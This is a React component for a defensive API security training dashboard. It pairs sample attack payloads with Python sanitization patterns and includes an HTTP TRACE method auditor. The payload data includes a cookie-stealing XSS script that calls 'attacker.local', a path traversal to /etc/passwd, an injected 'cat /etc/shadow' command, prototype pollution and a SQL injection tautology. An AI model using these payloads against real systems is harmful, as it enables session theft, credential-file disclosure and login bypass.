import React, { useState } from 'react';
import {
  Code2,
  ShieldCheck,
  AlertOctagon,
  CheckCircle2,
  XCircle,
  Copy,
  Check,
  FileCheck,
  ArrowRight,
  Sparkles,
} from 'lucide-react';
import { auditLogger } from '../services/securityEngine';

interface SanitizationVector {
  id: string;
  name: string;
  category: 'XSS' | 'Path Traversal' | 'Command Injection' | 'Prototype Pollution' | 'SQL Injection';
  samplePayload: string;
  vulnerableOutcome: string;
  defensiveSanitization: string;
  defenseMechanism: string;
  pythonSnippet: string;
}

const SANITIZATION_VECTORS: SanitizationVector[] = [
  {
    id: 'xss-1',
    name: 'Reflected Script Injection (XSS)',
    category: 'XSS',
    samplePayload: '<script>fetch("http://attacker.local/steal?c=" + document.cookie)</script>',
    vulnerableOutcome: 'Browser executes inline JavaScript directly in victim DOM context, exposing session cookies and tokens.',
    defensiveSanitization: '&lt;script&gt;fetch(&quot;http://attacker.local/steal?c=&quot; + document.cookie)&lt;/script&gt;',
    defenseMechanism: 'HTML Entity Encoding & Content-Security-Policy (CSP) script-src nonce restriction.',
    pythonSnippet: `# FastAPI / Pydantic HTML Sanitization
import html
from pydantic import BaseModel, validator

class UserInput(BaseModel):
    comment: str

    @validator('comment')
    def sanitize_html(cls, v):
        # Escape HTML entities to prevent DOM reflection
        return html.escape(v.strip())`,
  },
  {
    id: 'traversal-1',
    name: 'Directory / Path Traversal (LFI)',
    category: 'Path Traversal',
    samplePayload: '../../../../../../etc/passwd',
    vulnerableOutcome: 'Application breaks out of intended public document root, reading sensitive operating system files.',
    defensiveSanitization: 'os.path.abspath confinement + secure filename basename extraction: "passwd"',
    defenseMechanism: 'Path normalization and boundary verification (os.path.commonpath check).',
    pythonSnippet: `# Safe File Path Confinement in Python
import os
from pathlib import Path
from werkzeug.utils import secure_filename

SAFE_BASE_DIR = Path("/var/app/storage").resolve()

def get_safe_file_path(user_supplied_filename: str) -> Path:
    clean_name = secure_filename(user_supplied_filename)
    target_path = (SAFE_BASE_DIR / clean_name).resolve()
    # Verify path cannot escape SAFE_BASE_DIR
    if not target_path.is_relative_to(SAFE_BASE_DIR):
        raise PermissionError("Path traversal attempt detected!")
    return target_path`,
  },
  {
    id: 'cmd-1',
    name: 'OS Command Injection',
    category: 'Command Injection',
    samplePayload: '127.0.0.1; cat /etc/shadow',
    vulnerableOutcome: 'Passing unsanitized input to shell=True invokes a secondary shell pipeline with arbitrary system privileges.',
    defensiveSanitization: 'Argument list array pass: ["ping", "-c", "4", "127.0.0.1"] (Shell metacharacters treated as literal characters)',
    defenseMechanism: 'Disable shell=True. Use subprocess with explicit argument vector list and IP address type validation.',
    pythonSnippet: `# Safe Subprocess Execution without Shell Metacharacter Interpretation
import subprocess
import ipaddress

def safe_ping(target_ip_str: str):
    # Validate format strictly first
    ip = ipaddress.ip_address(target_ip_str) # Raises ValueError if invalid
    # Pass arguments strictly as a list, never with shell=True
    result = subprocess.run(
        ["ping", "-c", "2", str(ip)],
        capture_output=True,
        text=True,
        timeout=5,
        shell=False # CRITICAL: Disables shell parsing of ;, &&, |
    )
    return result.stdout`,
  },
  {
    id: 'proto-1',
    name: 'JSON Prototype / Deep Object Pollution',
    category: 'Prototype Pollution',
    samplePayload: '{"__proto__": {"isAdmin": true}, "role": "elevated"}',
    vulnerableOutcome: 'Recursive object merge pollutes Object.prototype in Node.js or modifies shared class attributes in Python.',
    defensiveSanitization: 'Reject forbidden keys ("__proto__", "constructor", "prototype") or use frozen Pydantic schemas with extra="forbid".',
    defenseMechanism: 'Schema enforcement using Pydantic ConfigDict(extra="forbid").',
    pythonSnippet: `# FastAPI Strict Pydantic Schema
from pydantic import BaseModel, ConfigDict, Field

class SafeProfileUpdate(BaseModel):
    model_config = ConfigDict(extra='forbid') # Rejects unrecognized keys immediately
    
    display_name: str = Field(..., max_length=50)
    email: str = Field(..., max_length=100)`,
  },
  {
    id: 'sqli-1',
    name: 'Authentication Bypass Tautology',
    category: 'SQL Injection',
    samplePayload: "admin' OR '1'='1",
    vulnerableOutcome: "WHERE clause evaluates to TRUE, bypassing password checks and logging the attacker in as the first user.",
    defensiveSanitization: "SELECT id, username FROM users WHERE username = ? [Value bound as literal string]",
    defenseMechanism: "Prepared parameterized statements. Input cannot modify AST grammar.",
    pythonSnippet: `# Secure Parameterized Execution
import sqlite3

def authenticate(username: str, conn: sqlite3.Connection):
    cursor = conn.cursor()
    # Placeholder ensures 'admin\\' OR \\'1\\'=\\'1' is searched literally
    cursor.execute("SELECT id, username FROM users WHERE username = ?", (username,))
    return cursor.fetchone()`,
  },
];

export const ApiSecurityView: React.FC = () => {
  const [selectedVector, setSelectedVector] = useState<SanitizationVector>(SANITIZATION_VECTORS[0]);
  const [customInput, setCustomInput] = useState(SANITIZATION_VECTORS[0].samplePayload);
  const [copied, setCopied] = useState(false);

  // Method check states
  const [testedMethod, setTestedMethod] = useState<'GET' | 'POST' | 'PUT' | 'DELETE' | 'OPTIONS' | 'TRACE'>('GET');
  const [methodResult, setMethodResult] = useState<{
    status: number;
    verdict: 'safe' | 'warning' | 'danger';
    note: string;
  }>({
    status: 200,
    verdict: 'safe',
    note: 'Standard idempotent read method. Allowed for authorized sessions.',
  });

  const handleSelectVector = (vec: SanitizationVector) => {
    setSelectedVector(vec);
    setCustomInput(vec.samplePayload);
    auditLogger.record('INPUT_TEST_SELECTED', 'api', 'nominal', `Inspecting test vector: ${vec.name}`, 'session-active');
  };

  const handleMethodAudit = (method: 'GET' | 'POST' | 'PUT' | 'DELETE' | 'OPTIONS' | 'TRACE') => {
    setTestedMethod(method);
    if (method === 'TRACE') {
      setMethodResult({
        status: 405,
        verdict: 'danger',
        note: 'TRACE method should be strictly disabled! TRACE can be abused in Cross-Site Tracing (XST) attacks to steal HttpOnly cookies.',
      });
      auditLogger.record('METHOD_AUDIT', 'api', 'high', 'TRACE method audited - flagged for XST risk', 'session-active', 'flagged');
    } else if (method === 'OPTIONS') {
      setMethodResult({
        status: 204,
        verdict: 'safe',
        note: 'CORS Preflight endpoint. Handled with explicit Access-Control-Allow-Methods.',
      });
      auditLogger.record('METHOD_AUDIT', 'api', 'nominal', 'OPTIONS preflight audited', 'session-active');
    } else {
      setMethodResult({
        status: 200,
        verdict: 'safe',
        note: `${method} handler configured with authentication validation middleware and payload bounds.`,
      });
      auditLogger.record('METHOD_AUDIT', 'api', 'nominal', `${method} method audited`, 'session-active');
    }
  };

  const copyCode = (code: string) => {
    navigator.clipboard.writeText(code);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  return (
    <div className="space-y-6">
      {/* Header Context */}
      <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 pb-3 border-b border-slate-800">
        <div>
          <h2 className="text-xl font-bold tracking-tight text-white flex items-center gap-2">
            <Code2 className="w-5 h-5 text-cyan-400" />
            API Endpoint Testing & Defensive Input Sanitization
          </h2>
          <div className="flex items-center gap-2 text-xs text-slate-400 mt-1">
            <span>OWASP Input Validation Standard</span>
            <span aria-hidden="true">·</span>
            <span>HTTP Verb Whitelisting</span>
            <span aria-hidden="true">·</span>
            <span>Contextual Encoding & Boundary Confinement</span>
          </div>
        </div>

        <div className="flex items-center gap-2 text-xs font-mono text-slate-400">
          <span className="w-2 h-2 rounded-full bg-emerald-400" />
          <span>SCHEMA_VALIDATION_STRICT</span>
        </div>
      </div>

      {/* Part 1: HTTP Method Audit Matrix */}
      <div className="p-4 rounded-lg border border-slate-800 bg-slate-900/60 space-y-3">
        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2">
          <div>
            <h3 className="text-sm font-semibold text-white">
              HTTP Method & Cross-Site Tracing (XST) Auditor
            </h3>
            <p className="text-xs text-slate-400 mt-0.5">
              Ensure dangerous HTTP verbs like TRACE or unhandled wildcards are explicitly blocked by the backend routing layer.
            </p>
          </div>
          <div className="flex items-center gap-1 bg-slate-950 p-1 rounded-md border border-slate-800">
            {(['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'TRACE'] as const).map((m) => (
              <button
                key={m}
                onClick={() => handleMethodAudit(m)}
                className={`px-2.5 py-1 text-xs font-mono font-medium rounded transition-colors ${
                  testedMethod === m
                    ? m === 'TRACE'
                      ? 'bg-rose-950 text-rose-300 font-bold border border-rose-600'
                      : 'bg-slate-800 text-cyan-300 font-bold border border-slate-700'
                    : 'text-slate-400 hover:text-slate-200'
                }`}
              >
                {m}
              </button>
            ))}
          </div>
        </div>

        <div
          className={`p-3 rounded-md text-xs font-mono flex items-center justify-between border ${
            methodResult.verdict === 'danger'
              ? 'bg-rose-950/30 border-rose-500/40 text-rose-200'
              : 'bg-slate-950 border-slate-800 text-slate-300'
          }`}
        >
          <div className="flex items-center gap-2.5">
            <span className="font-bold text-white uppercase">{testedMethod}</span>
            <span aria-hidden="true">·</span>
            <span className="text-slate-400">Response Code:</span>
            <span
              className={`font-semibold tabular-nums ${
                methodResult.verdict === 'danger' ? 'text-rose-400' : 'text-emerald-400'
              }`}
            >
              HTTP {methodResult.status}
            </span>
            <span aria-hidden="true">·</span>
            <span>{methodResult.note}</span>
          </div>
          <div className="text-[11px] text-slate-400 hidden md:block">
            {methodResult.verdict === 'danger' ? 'BLOCK IN PRODUCTION' : 'CONSTRAINED'}
          </div>
        </div>
      </div>

      {/* Part 2: Input Sanitization Workbench */}
      <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
        {/* Left: Vector Selector List */}
        <div className="space-y-2">
          <div className="text-xs uppercase font-semibold text-slate-400 tracking-wider">
            Common Vulnerability Test Vectors
          </div>
          <div className="space-y-1.5">
            {SANITIZATION_VECTORS.map((vec) => {
              const isSelected = selectedVector.id === vec.id;
              return (
                <button
                  key={vec.id}
                  onClick={() => handleSelectVector(vec)}
                  className={`w-full text-left p-3 rounded-lg border transition-all ${
                    isSelected
                      ? 'bg-slate-900 border-cyan-500/40 text-white shadow-sm'
                      : 'bg-slate-950/60 border-slate-800/80 text-slate-400 hover:text-slate-200 hover:bg-slate-900/50'
                  }`}
                >
                  <div className="flex items-center justify-between text-xs font-medium">
                    <span className="text-white font-semibold">{vec.name}</span>
                    <span className="text-[11px] font-mono text-cyan-400">{vec.category}</span>
                  </div>
                  <div className="mt-1 font-mono text-[11px] text-slate-400 truncate">
                    {vec.samplePayload}
                  </div>
                </button>
              );
            })}
          </div>
        </div>

        {/* Right: Interactive Evaluation & Sanitization Comparison */}
        <div className="lg:col-span-2 space-y-4">
          <div className="p-5 rounded-lg border border-slate-800 bg-slate-900/60 space-y-4">
            <div className="flex items-center justify-between">
              <div>
                <span className="text-xs font-mono text-cyan-400 uppercase tracking-wider">
                  {selectedVector.category} Lab Analysis
                </span>
                <h3 className="text-base font-bold text-white mt-0.5">
                  {selectedVector.name}
                </h3>
              </div>
              <span className="text-xs text-slate-400 font-mono">
                Safe Defense: Active
              </span>
            </div>

            {/* Editable Payload */}
            <div>
              <label className="block text-xs font-semibold text-slate-300 uppercase tracking-wider mb-1">
                Active Test Payload
              </label>
              <div className="flex items-center gap-2">
                <input
                  type="text"
                  value={customInput}
                  onChange={(e) => setCustomInput(e.target.value)}
                  className="flex-1 px-3 py-2 bg-slate-950 border border-slate-800 rounded-md font-mono text-xs text-rose-300 focus:outline-none focus:border-cyan-500"
                />
                <button
                  onClick={() => setCustomInput(selectedVector.samplePayload)}
                  className="px-2.5 py-2 text-xs text-slate-400 hover:text-white bg-slate-950 border border-slate-800 rounded-md"
                  title="Reset to default payload"
                >
                  Reset
                </button>
              </div>
            </div>

            {/* Side by side: Vulnerable vs Defensive */}
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4 pt-1">
              {/* Vulnerable Result */}
              <div className="p-3.5 rounded-lg border border-rose-900/40 bg-rose-950/20 space-y-2">
                <div className="flex items-center gap-1.5 text-xs font-semibold text-rose-400">
                  <XCircle className="w-4 h-4 shrink-0" />
                  <span>Unhardened Interpretation (Flaw)</span>
                </div>
                <p className="text-xs text-slate-300 leading-relaxed">
                  {selectedVector.vulnerableOutcome}
                </p>
              </div>

              {/* Defensive Sanitization */}
              <div className="p-3.5 rounded-lg border border-emerald-900/40 bg-emerald-950/20 space-y-2">
                <div className="flex items-center gap-1.5 text-xs font-semibold text-emerald-400">
                  <CheckCircle2 className="w-4 h-4 shrink-0" />
                  <span>Sanitized & Mitigated State</span>
                </div>
                <div className="font-mono text-[11px] text-emerald-300 bg-slate-950 p-2 rounded border border-emerald-900/30 break-all">
                  {selectedVector.defensiveSanitization}
                </div>
                <p className="text-xs text-slate-300 leading-relaxed">
                  {selectedVector.defenseMechanism}
                </p>
              </div>
            </div>

            {/* Python Implementation Recipe */}
            <div className="pt-2 border-t border-slate-800/80">
              <div className="flex items-center justify-between text-xs text-slate-400 mb-1.5">
                <span className="font-medium text-slate-300">
                  Defensive Python Implementation Pattern:
                </span>
                <button
                  onClick={() => copyCode(selectedVector.pythonSnippet)}
                  className="text-cyan-400 hover:text-cyan-300 flex items-center gap-1 transition-colors text-[11px]"
                >
                  {copied ? (
                    <>
                      <Check className="w-3 h-3 text-emerald-400" />
                      <span className="text-emerald-400">Copied</span>
                    </>
                  ) : (
                    <>
                      <Copy className="w-3 h-3" />
                      <span>Copy Python Pattern</span>
                    </>
                  )}
                </button>
              </div>
              <pre className="p-3 bg-slate-950 rounded-lg border border-slate-800 font-mono text-[11px] text-cyan-200 overflow-x-auto leading-relaxed">
                <code>{selectedVector.pythonSnippet}</code>
              </pre>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};
